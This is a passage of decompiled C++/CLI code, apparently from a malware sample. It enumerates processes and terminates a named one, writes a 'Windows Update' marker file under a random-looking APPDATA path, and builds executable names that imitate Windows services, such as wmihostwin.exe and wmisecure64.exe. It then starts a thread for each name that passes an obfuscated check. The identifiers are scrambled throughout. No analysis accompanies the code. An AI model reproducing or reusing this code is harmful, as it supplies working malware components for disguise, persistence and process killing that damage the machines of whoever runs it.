        _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar3;
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D\u003Cclass\u0020std\u003A\u003A_String_iterator\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E(&stdAllocatorWcharT, *\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ebegin(&stdAllocatorChar1, &stdAllocatorChar2), *\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Eend(&stdAllocatorChar1, &stdAllocatorChar3));
        // ISSUE: fault handler
        try
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ref tagProcessentrY32W = 556;
          toolhelp32Snapshot = \u003CModule\u003E.CreateToolhelp32Snapshot(2U, 0U);
          if ((IntPtr) toolhelp32Snapshot != new IntPtr(-1))
            goto label_9;
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar1);
      return;
label_9:
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.Process32FirstW(toolhelp32Snapshot, &tagProcessentrY32W);
          if (\u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ecompare(&stdAllocatorWcharT, (char*) ((IntPtr) &tagProcessentrY32W + 36)) == 0)
          {
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            \u003CModule\u003E.TerminateProcess(\u003CModule\u003E.OpenProcess(1U, 0, (uint) ^(int&) ((IntPtr) &tagProcessentrY32W + 8)), 9U);
            \u003CModule\u003E.CloseHandle(toolhelp32Snapshot);
          }
          else
            goto label_15;
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar1);
      return;
label_15:
      while (true)
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            if (\u003CModule\u003E.Process32NextW(toolhelp32Snapshot, &tagProcessentrY32W) != 0)
            {
              if (\u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ecompare(&stdAllocatorWcharT, (char*) ((IntPtr) &tagProcessentrY32W + 36)) == 0)
              {
                // ISSUE: cast to a reference type
                // ISSUE: explicit reference operation
                \u003CModule\u003E.TerminateProcess(\u003CModule\u003E.OpenProcess(1U, 0, (uint) ^(int&) ((IntPtr) &tagProcessentrY32W + 8)), 9U);
                \u003CModule\u003E.CloseHandle(toolhelp32Snapshot);
              }
              else
                goto label_23;
            }
            else
              goto label_26;
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT);
          break;
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
        }
label_23:
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
          }
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
        }
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar1);
      return;
label_26:
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.CloseHandle(toolhelp32Snapshot);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar1);
    }
    catch (Exception ex)
    {
    }
    catch (Exception ex1) when (
    {
      // ISSUE: unable to correctly present filter
      exception* exceptionPtr;
      if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) &\u003CModule\u003E.\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408, 0, (void*) &exceptionPtr) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint num2 = 0;
      \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
      try
      {
        try
        {
        }
        catch (Exception ex2) when (
        {
          // ISSUE: unable to correctly present filter
          num2 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (num2 != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        return;
        if (num2 == 0U)
          return;
        throw;
      }
      finally
      {
        \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num2);
      }
    }
  }

  internal static unsafe void WNmU()
  {
    basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
    \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar1, 3, 1);
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar1 + 8), \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07FMLNDKFM\u0040APPDATA\u003F\u0024AA\u0040)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0CF\u0040CMFNPAMF\u0040\u003F26s5d4f65ds4g65d47gfd684gfd_0022\u0040);
      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar2);
      bool flag;
      // ISSUE: fault handler
      try
      {
        uint fileAttributesA = \u003CModule\u003E.GetFileAttributesA(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr));
        flag = fileAttributesA != uint.MaxValue && (~(int) (fileAttributesA >> 4) & 1) != 0;
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
      if (!flag)
        goto label_7;
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar1);
    }
    \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
    return;
label_7:
    // ISSUE: fault handler
    try
    {
      basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E stdCharTraitsChar;
      \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdCharTraitsChar, 1);
      // ISSUE: fault handler
      try
      {
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar3;
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr1 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar1, &stdAllocatorChar3);
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eopen(&stdCharTraitsChar, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr1), 2, 64);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar3);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar3);
        \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) &stdCharTraitsChar, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0P\u0040PJAKFCMN\u0040Windows\u003F5Update\u003F\u0024AA\u0040);
        \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eclose(&stdCharTraitsChar);
        \u0024ArrayType\u0024\u0024\u0024BY05PAD arrayTypeBy05Pad;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref arrayTypeBy05Pad = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0O\u0040JKEHPDIC\u0040wmiintegrator\u003F\u0024AA\u0040;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &arrayTypeBy05Pad + 4) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0L\u0040CCDMCBJN\u0040wmihostwin\u003F\u0024AA\u0040;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &arrayTypeBy05Pad + 8) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_06BMIHBJFI\u0040winlsv\u003F\u0024AA\u0040;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &arrayTypeBy05Pad + 12) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_09CCFNPOLL\u0040wmisecure\u003F\u0024AA\u0040;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &arrayTypeBy05Pad + 16) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_0M\u0040MGPIOAOA\u0040wmisecure64\u003F\u0024AA\u0040;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &arrayTypeBy05Pad + 20) = (int) &\u003CModule\u003E.\u003F\u003F_C\u0040_06KLIOCAIJ\u0040wmimic\u003F\u0024AA\u0040;
        basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar4;
        \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar4, 3, 1);
label_12:
        // ISSUE: fault handler
        try
        {
          int num1 = 0;
          int num2 = 0;
          do
          {
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar5;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar5, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_00CNPNBAHC\u0040\u003F\u0024AA\u0040);
            // ISSUE: fault handler
            try
            {
              \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar4, &stdAllocatorChar5);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar5);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar5);
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar4 + 8), (sbyte*) ^(int&) (num2 * 4 + (IntPtr) &arrayTypeBy05Pad)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_04JLMDILM\u0040\u003F4exe\u003F\u0024AA\u0040);
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar6;
            \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar4, &stdAllocatorChar6);
            basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT;
            // ISSUE: fault handler
            try
            {
              _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar7;
              _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E _Last = *\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Eend(&stdAllocatorChar6, &stdAllocatorChar7);
              _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar8;
              _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E _First = *\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ebegin(&stdAllocatorChar6, &stdAllocatorChar8);
              allocator\u003Cwchar_t\u003E allocatorWcharT;
              \u003CModule\u003E.std\u002E_String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D((_String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) &stdAllocatorWcharT, \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT));
              \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Tidy(&stdAllocatorWcharT, false, 0U);
              forward_iterator_tag __unnamed002;
              \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003A_String_iterator\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E(&stdAllocatorWcharT, _First, _Last, __unnamed002);
              // ISSUE: fault handler
              try
              {
                if (\u003CModule\u003E.pWNqRmwPzwupZ(&stdAllocatorWcharT))
                  goto label_24;
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar6);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar6);
            goto label_32;
label_24:
            // ISSUE: fault handler
            try
            {
              // ISSUE: fault handler
              try
              {
                ++num1;
                basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar9;
                basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr2 = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar4, &stdAllocatorChar9);
                // ISSUE: fault handler
                try
                {
                  // ISSUE: method pointer
                  // ISSUE: cast to a function pointer type
                  JARVIS.Thread.create((__FnPtr<void (List<object>)>) __methodptr(HZIStDwd), true).addArgument((object) new string(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(stdAllocatorCharPtr2))).start();
                }
                __fault
                {
                  // ISSUE: method pointer
                  // ISSUE: cast to a function pointer type
                  \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar9);
                }
                \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar9);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
